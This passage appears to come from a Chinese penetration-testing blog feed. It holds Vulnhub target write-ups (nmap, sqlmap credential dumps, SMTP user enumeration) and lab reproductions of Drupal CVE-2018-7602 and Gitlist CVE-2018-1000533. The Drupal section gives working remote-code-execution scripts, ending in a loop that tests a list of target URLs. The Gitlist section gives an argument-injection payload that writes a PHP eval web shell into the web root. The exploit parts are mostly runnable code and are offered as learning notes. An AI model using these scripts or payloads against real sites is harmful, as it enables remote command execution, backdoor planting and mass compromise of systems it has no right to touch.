+<p><code>openssl enc -d -aes-256-cbc -in customer_account.csv.enc -out customer_account.csv -pass file:/etc/ssl/certs/pw</code><img src="/images/image-20220210010811369.png" alt="image-20220210010811369"></p>
+<p>查看到文件内容。好几个人的信息。</p>
+<h3 id="总结-4">总结</h3>
+<p>字典要强大才能应对各种密码。</p>
+]]></content>
+      <categories>
+        <category>靶机</category>
+      </categories>
+      <tags>
+        <tag>END 文章已结束</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>De-ICE_S1.120</title>
+    <url>/2022/02/22/DE-ICE%20S1.120/</url>
+    <content><![CDATA[<h3 id="靶机信息">靶机信息</h3>
+<p>下载地址：<a href="https://www.vulnhub.com/entry/de-ice-s1120,10/">https://www.vulnhub.com/entry/de-ice-s1120,10/</a></p>
+<p>靶机IP：192.168.1.120</p>
+<p>攻击IP：192.168.1.128</p>
+<p>运行环境：VMware</p>
+<h3 id="信息收集-3">信息收集</h3>
+<p>开始老配方的扫描</p>
+<p><code>nmap -sS 192.168.1.1/24</code><img src="/images/image-20220210185154070.png" alt="image-20220210185154070"></p>
+<p>这次开放的端口挺多，对端口信息详情获取扫一下</p>
+<p><code>nmap -A 192.168.1.120</code><img src="/images/image-20220210185511789.png" alt="image-20220210185511789"></p>
+<p>ftp可以匿名登录，/incoming，啥都没有空文件<img src="/images/image-20220210185846860.png" alt="image-20220210185846860"></p>
+<p>去网站看看，有什么发现。</p>
+<p>先扫个目录，能不能捡到漏。</p>
+<p><code>dirb http://192.168.1.120</code> <img src="/images/image-20220210193852636.png" alt="image-20220210193852636"></p>
+<p>这里有个和数据库交互的地方，可能能直接写入🐎，尝试XSS，有反应。继续看有没有别的网站。<img src="/images/image-20220210190626479.png" alt="image-20220210190626479"></p>
+<p>这里可以查询刚才输入的内容，或许可以直接查询mysql数据库</p>
+<p>在扫描目录中发现好几个可以用的网站，这个应该是网站的查询规则<img src="/images/image-20220210194000231.png" alt="image-20220210194000231"></p>
+<p>还发现了一个上传点，还有phpmyadmin所在的目录/opt/lampp/phpmyadmin/libraries<img src="/images/image-20220210194143206.png" alt="image-20220210194143206"></p>
+<h3 id="开始操作">开始操作</h3>
+<p>尝试SQL注入，地址为http://192.168.1.120/products.php?id=3</p>
+<p><code>sqlmap -u http://192.168.1.120/products.php?id=3 </code></p>
+<p><img src="/images/image-20220210212640345.png" alt="image-20220210212640345"></p>
+<p>存在注入开始爆破用户和密码</p>
+<p><code>sqlmap -u http://192.168.1.120/products.php?id=3 -batch -D mysql -T user -C user,host,password -dump</code><img src="/images/image-20220210213042093.png" alt="image-20220210213042093"></p>
+<p>公司日渐壮大人员越来越多，但是bbanter安全意识到越来越薄弱了。继续使用bbanter登录ssh</p>
+<p><code>uname -a</code><img src="/images/image-20220210215916095.png" alt="image-20220210215916095"></p>
+<p><code>sudo -l</code><img src="/images/image-20220210220238672.png" alt="image-20220210220238672"></p>
+<p>啥权限没有，可能还是个实习生。换一个账号看看。<img src="/images/image-20220210220600417.png" alt="image-20220210220600417"></p>
+<h3 id="提权-2">提权</h3>
+<p>在ccoffee权限里面有一个shell脚本root权限，让我用脚本提权？？<img src="/images/image-20220210222043145.png" alt="image-20220210222043145"></p>
+<p>先将原本的shell 文件更名，重新写入一个同名的shell文件。赋予读写权力，运行shell文件获得root权限。</p>
+<h3 id="总结-5">总结</h3>
+<p>同样可以扫描局域网的<em>netdiscover</em>，先去收集多的信息，越多越好。有多人信息时，没有明确的高权用户暂时就不要盲目提权，收集各个账号的权限，有选择性的进行提权。</p>
+<p>sql 命令，sql注入，xss注入，sqlmap工具，xsser工具。</p>
+]]></content>
+      <categories>
+        <category>靶机</category>
+      </categories>
+      <tags>
+        <tag>END 文章已结束</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>De-ICE_S1.130</title>
+    <url>/2022/02/22/De-ICE_S1.130/</url>
+    <content><![CDATA[<h3 id="靶机信息-2">靶机信息</h3>
+<ul>
+<li>靶机下载：<a href="http://hackingdojo.com/downloads/iso/De-ICE_S1.130.iso">http://hackingdojo.com/downloads/iso/De-ICE_S1.130.iso</a></li>
+<li>靶机IP：192.168.1.130</li>
+<li>攻击IP：192.168.1.128</li>
+<li>运行环境：VMware</li>
+</ul>
+<h3 id="收集信息">收集信息</h3>
+<ul>
+<li>使用<em>netdiscover</em><img src="/images/image-20220212063238955.png" alt="image-20220212063238955"></li>
+<li><code>nmap -A 192.168.1.20</code><img src="/images/image-20220212063600042.png" alt="image-20220212063600042"></li>
+</ul>
+<p>还让匿名登录但是没有获取到东西，受到了欺骗，无法连接并看不到里面有什么东西，看看网址吧</p>
+<ul>
+<li><code>dirsearch -u 192.168.1.20</code>   <img src="/images/image-20220212064503074.png" alt="image-20220212064503074"></li>
+</ul>
+<p>看着没有太多东西，感觉要去查攻略了。</p>
+<p><img src="/images/image-20220212064709406.png" alt="image-20220212064709406"> 一下就维护，肯定是要倒闭了。获得一个电话一个邮箱地址。</p>
+<p>没有一点想法，查看攻略使用customerserviceadmin，生成字典然后验证是否存在该用户<img src="/images/image-20220212103331317.png" alt="image-20220212103331317"></p>
+<p>pyhton进行分段生成字典，因为permutations的r参数不能迭代，只能手动进行修改。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">life = <span class="built_in">open</span>(<span class="string">&#x27;D:/桌面/221.txt&#x27;</span>,<span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations([<span class="string">&#x27;customer&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;service&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;administrator&#x27;</span>],<span class="number">7</span>):</span><br><span class="line">    life.write(<span class="string">&#x27;&#x27;</span>.join(i)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(i))</span><br><span class="line">life.close()</span><br></pre></td></tr></table></figure>
+<p>然后靶机开放SMTP攻略的想法是使用python，进行smtp用户名在返回的 SMTP 服务扩展集合中则返回true，验证是否存在。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/home/kali/桌面/221.txt&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    </span><br><span class="line">    lines = file.readlines(<span class="number">100000</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> lines:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        a = smtplib.SMTP()</span><br><span class="line">        a.connect(<span class="string">&quot;192.168.1.20&quot;</span>,<span class="string">&quot;25&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> a.ehlo(<span class="string">&#x27;csadmin&#x27;</span>)==<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(line)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            a.quit()</span><br><span class="line">file.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>然后改代码失效，并没有验证出谁存在，然后查看攻略发现使用别人使用的套接字，完全想错了。查看别人的代码。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line">filename = sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> f:</span><br><span class="line">    users = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines() <span class="keyword">if</span> line]</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">s.connect((sys.argv[<span class="number">1</span>], <span class="number">25</span>))</span><br><span class="line">fn = s.makefile(<span class="string">&#x27;rwb&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">fn.readline()                </span><br><span class="line">fn.write(<span class="string">&#x27;mail from: kali@slax.example.net \r\n&#x27;</span>)</span><br><span class="line">fn.flush()</span><br><span class="line">fn.readline()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">    fn.write(<span class="string">&#x27;rcpt to: %s\r\n&#x27;</span> % user)</span><br><span class="line">    fn.flush()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;%s: %s&#x27;</span> % (user, fn.readline().strip())</span><br><span class="line"> </span><br><span class="line">fn.write(<span class="string">&#x27;QUIT\r\n&#x27;</span>)</span><br><span class="line">fn.flush()</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+<h3 id="总结-6">总结</h3>
+<p><strong>Nikto</strong></p>
+<p>wc</p>
+<p>smtp</p>
+<p>cupp</p>
+<p>套接字</p>
+<p>scoket</p>
+<p>io流</p>
+<p>python</p>
+]]></content>
+      <categories>
+        <category>靶机</category>
+      </categories>
+      <tags>
+        <tag>END 文章已结束</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Drupal 远程代码执行漏洞（CVE-2018-7602）</title>
+    <url>/2022/02/22/Drupal%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-7602%EF%BC%89/</url>
+    <content><![CDATA[<h3 id="Drupal介绍">Drupal介绍</h3>
+<p>Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由<a href="https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/2683135">内容管理系统</a>（CMS）和PHP开发框架（Framework）共同构成，可以用来建设从个人网站到大型社区网站。</p>
+<h3 id="漏洞描述">漏洞描述</h3>
+<p>是由两个问题叠加而成，一、在程序buildform处，用户传入的变量没有受到限制，导致可以传入mali[#post_render]、mail[#type]这样得变量。二、使用uploadAjaxCallback方法中得$from_parents变量是直接通过get(‘element——parents’)得来的，结合之后就造成了打洞。</p>
+<p>受影响得版本有 Drupal 6，7，8等多个子版本。</p>
+<h3 id="漏洞复现-2">漏洞复现</h3>
+<p>靶机地址：192.168.1.134</p>
+<p>攻击地址：192.168.1.128</p>
+<p>启动漏洞环境，</p>
+<p><code>docker-compose up -d</code></p>
+<p>访问http://192.168.1.134:8080/，访问的同时burp进行抓包</p>
+<p><img src="/images/image-20220217100554355.png" alt="image-20220217100554355"></p>
+<p>起始页面。有个登陆的地方，进入后看见可以进行注册，开始注册抓包。</p>
+<p><img src="/images/image-20220217102609824.png" alt="image-20220217102609824"></p>
+<p>抓到了一个传输的包，传输完成后会在网页上显示传入照片的小图</p>
+<p><img src="/images/image-20220217103045365.png" alt="image-20220217103045365"></p>
+<p>这个地址就是执行恶意待码的地方</p>
+<p><code>form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id</code></p>
+<p><img src="/images/image-20220217104804651.png" alt="image-20220217104804651"></p>
+<p>并没有执行成功，尝试其他的地方，发现都是一样的，漏洞是真的难发现。查看别人的分析，在程序调用的时候，$from_parents变量是从get中传入的，意味着这个变量是可控的，所有上传图片中的地址需要改成<em>element_parents=account/mail/%23value</em>至于为什么是这个三个参数传入变量中，我没看明白。修改传入地址为</p>
+<p><code>/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax&amp;_wrapper_format=drupal_ajax</code></p>
+<p><img src="/images/image-20220217110536750.png" alt="image-20220217110536750"></p>
+<p>只需要修改命令<code>id</code>命令为其他命令就可以进行恶意破坏。</p>
+<h3 id="脚本编写-2">脚本编写</h3>
+<p>先构建POST的请求包直接携带恶意代码，然后就是对URL可输入和输入内容的筛选输出，最后开启自动化。</p>
+<ul>
+<li>第一步，构建POST请求</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://192.168.1.134:8080/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax&amp;_wrapper_format=drupal_ajax&#x27;</span>     <span class="comment">#目标地址</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>:<span class="string">&#x27;http://192.168.1.134:8080&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>:<span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>:<span class="string">&#x27;http://192.168.1.134:8080/user/login&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>:<span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>:<span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span></span><br><span class="line">&#125;     <span class="comment">#表头</span></span><br><span class="line">body = &#123;<span class="string">&#x27;form_id&#x27;</span>:<span class="string">&quot;user_register_form&quot;</span>,<span class="string">&#x27;_drupal_ajax&#x27;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;mail[#post_render][]&quot;</span>:<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;mail[#type]&quot;</span>:<span class="string">&#x27;markup&#x27;</span>,<span class="string">&#x27;mail[#markup]&#x27;</span>:<span class="string">&quot;whoami&quot;</span>&#125;   <span class="comment">#post请求包内容</span></span><br><span class="line"></span><br><span class="line">cve = requests.post(url=url,headers=header,data=body)   <span class="comment">#发送请求包</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cve.text)  <span class="comment">#查看返回包内容</span></span><br></pre></td></tr></table></figure>
+<p><code>这里构建post数据的时候，直接将所有数据一起发送出去了，并没有仔细看别人的分析之类的，导致耽误时间过长，重新查看才发现，不是一个变量传入请求的。这里重新补一张图。总归是菜还心急。而且还是没有看出来地址原因。了解到是传入的参数</code></p>
+<p><img src="/images/image-20220217212209015.png" alt="image-20220217212209015"></p>
+<ul>
+<li>第二步，筛选输入内容对地址的更改，对成功的判断</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ur = <span class="built_in">input</span>(<span class="string">&#x27;请输入上传网址：&#x27;</span>)   <span class="comment">#输入网址</span></span><br><span class="line">comm = <span class="built_in">input</span>(<span class="string">&#x27;输入执行命令：&#x27;</span>)   <span class="comment">#输入命令</span></span><br><span class="line">url = ur + <span class="string">&#x27;/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax&amp;_wrapper_format=drupal_ajax&#x27;</span>         <span class="comment">#整合网址定位到上传图片位置</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>:<span class="string">&#x27;http://192.168.1.134:8080&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>:<span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>:<span class="string">&#x27;http://192.168.1.134:8080/user/login&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>:<span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>:<span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">body = &#123;<span class="string">&#x27;form_id&#x27;</span>:<span class="string">&quot;user_register_form&quot;</span>,<span class="string">&#x27;_drupal_ajax&#x27;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;mail[#post_render][]&quot;</span>:<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;mail[#type]&quot;</span>:<span class="string">&#x27;markup&#x27;</span>,<span class="string">&#x27;mail[#markup]&#x27;</span>:<span class="string">&quot;whoami&quot;</span>&#125;</span><br><span class="line"><span class="keyword">if</span> comm != <span class="string">&#x27;&#x27;</span>:    <span class="comment">#判断是否输入命令，</span></span><br><span class="line">    body[<span class="string">&#x27;mail[#markup]&#x27;</span>] = comm    <span class="comment">#更改post包中的命令</span></span><br><span class="line">cve = requests.post(url=url,headers=header,data=body)    <span class="comment">#发包</span></span><br><span class="line">s = <span class="string">r&#x27;a&quot;:&quot;(.*?)\\u003Cspan&#x27;</span>          <span class="comment">#匹配命令输出的正则表达式</span></span><br><span class="line">inp = re.findall(s,cve.text)      <span class="comment">#对返回包进行匹配</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> inp:                    <span class="comment">#判断命令是否执行成功</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;错误&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(inp)                     <span class="comment">#输出执行结果</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>第三步、进行地址字典导入，进行判断</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:/桌面/211.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:   <span class="comment">#以with方式打开文件</span></span><br><span class="line">    <span class="keyword">for</span> files <span class="keyword">in</span> file:          <span class="comment">#按行读取文件</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> files:           <span class="comment">#读完就退出</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        url = files + <span class="string">&#x27;/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax&amp;_wrapper_format=drupal_ajax&#x27;</span></span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Origin&#x27;</span>:<span class="string">&#x27;http://192.168.1.134:8080&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Cache-Control&#x27;</span>:<span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Referer&#x27;</span>:<span class="string">&#x27;http://192.168.1.134:8080/user/login&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Language&#x27;</span>:<span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Connection&#x27;</span>:<span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        body = &#123;<span class="string">&#x27;form_id&#x27;</span>:<span class="string">&quot;user_register_form&quot;</span>,<span class="string">&#x27;_drupal_ajax&#x27;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;mail[#post_render][]&quot;</span>:<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;mail[#type]&quot;</span>:<span class="string">&#x27;markup&#x27;</span>,<span class="string">&#x27;mail[#markup]&#x27;</span>:<span class="string">&quot;whoami&quot;</span>&#125;</span><br><span class="line">        cve = requests.post(url=url,headers=header,data=body)</span><br><span class="line">        s = <span class="string">r&#x27;a&quot;:&quot;(.*?)\\u003Cspan&#x27;</span></span><br><span class="line">        inp = re.findall(s,cve.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> inp:                               <span class="comment">#对结果进行判断</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;错误&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(files + <span class="string">&#x27;漏洞存在&#x27;</span>)              <span class="comment">#存在漏洞就输出地址</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>最后一步取消了命令修改，为了节省时间，直接跑命令。</p>
+<h3 id="总结-7">总结</h3>
+<p>对这个漏洞的细节没有搞得很清楚，对源代码的阅读太差劲了。这个漏洞的地址比较隐蔽，进行目标测试时，需要实时进行流量抓捕。为节省时间没有理解传输的数据包就进行操作，耽误大量时间得不偿失。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>END 文章已结束</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Gitlist远程命令执行漏洞(CVE-2018-1000533)</title>
+    <url>/2022/02/22/Gitlist%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(cve-2018-1000533)/</url>
+    <content><![CDATA[<h3 id="Gitlist介绍">Gitlist介绍</h3>
+<p>Gitlist官网：<a href="https://gitlist.org/">https://gitlist.org/</a></p>
+<p>gitlist是一款git存储库查看器，开源免费的，用PHP编写基于Sliex和Twig模板引擎。可以通过web界面浏览您的git存储库。</p>
+<h3 id="漏洞详情">漏洞详情</h3>
+<p>Gitlis在其0.6.0版本及以前，存在漏洞注入</p>
+<p>查看大佬的分析，gitlist调用git grep命令，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mi>u</mi><mi>e</mi><mi>r</mi><mi>y</mi><mtext>是搜索关键字，</mtext></mrow><annotation encoding="application/x-tex">query是搜索关键字，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.03588em;">ery</span><span class="mord cjk_fallback">是搜索关键字，</span></span></span></span>branch是搜索的分支。</p>
+<p><img src="/images/image-20220216102835177.png" alt="image-20220216102835177"></p>
+<p>escapeshellarg处理后就会变成能正常执行的shell参数。没有对query的内容进行判断过滤。导致命令的执行。这里我们改成POST包，访问`/example/tree/a/search`，其中example是项目名称，需要是目标gitlist上一个已存在的项目；a在正常情况下应该是分支的名称，也就是"grep -i --line-number `{query}<code> </code><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>h</mi><mi mathvariant="normal">‘</mi><mi mathvariant="normal">&quot;</mi><mtext>中的</mtext><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">branch`&quot;中的`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">an</span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mord">‘&quot;</span><span class="mord cjk_fallback">中的</span><span class="mord">‘</span></span></span></span>branch<code>，但因为我们的</code><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mi>u</mi><mi>e</mi><mi>r</mi><mi>y</mi><mi mathvariant="normal">‘</mi><mtext>被当成了一个参数，所以</mtext><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">query`被当成了一个参数，所以`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.03588em;">ery</span><span class="mord">‘</span><span class="mord cjk_fallback">被当成了一个参数，所以</span><span class="mord">‘</span></span></span></span>branch`就应该被当做搜索的关键字，关键字如下。</p>
+<p><code>a在创建文件时，表示的是在创建的目录下搜索a这个字母，不存在时无法创建</code>尝试多次验证，具有偶然性</p>
+<h3 id="漏洞复现-3">漏洞复现</h3>
+<p>使用vulhub进行漏洞复现</p>
+<p><code>docker-compose up -d</code></p>
+<p><img src="/images/image-20220216124932873.png" alt="image-20220216124932873"></p>
+<p>漏洞已开启，访问网页，并没有什么其他的东西。</p>
+<p><img src="/images/image-20220216125048777.png" alt="image-20220216125048777"></p>
+<p>更改get数据包，改为POST，进行文件上传，</p>
+<p><img src="/images/image-20220216130127642.png" alt="image-20220216130127642"></p>
+<p>在docker靶机内查看，文件已被写入可以使用冰蝎进行连接</p>
+<p><img src="/images/image-20220216130223260.png" alt="image-20220216130223260"></p>
+<p>尝试网页输入xxx22.php，页面存在可以连接。</p>
+<p><img src="/images/image-20220216130343874.png" alt="image-20220216130343874"></p>
+<h3 id="执行脚本">执行脚本</h3>
+<p>还是先进行POST包构造，写入目录后尝试访问php文件状态码来判断，在进行目录字典的筛查。最后在添加可输入的gitlist项目。</p>
+<p>第一步，用熟悉的requests构建POST数据包</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://192.168.1.134:8080/example/tree/o/search&#x27;</span>    <span class="comment">#目录地址example必须是已存在</span></span><br><span class="line">header = &#123;               <span class="comment">#POST包头</span></span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">body = &#123;<span class="string">&#x27;query&#x27;</span>:<span class="string">&quot;--open-files-in-pager=echo &#x27;&lt;?php eval($_POST[&#x27;xxx&#x27;])?&gt;&#x27; &gt; /var/www/html/csm.php;&quot;</span>&#125;       <span class="comment">#执行的恶意代码</span></span><br><span class="line">res = requests.post(url=url,data=body,headers=header)   <span class="comment">#进行上传恶意代码</span></span><br><span class="line"><span class="built_in">print</span>(res.status_code)        <span class="comment">#放回响应码</span></span><br></pre></td></tr></table></figure>
+<p>第二步，进行上传是否成功验证，验证完后是不是要删除文件还不能确定。先写入进去</p>
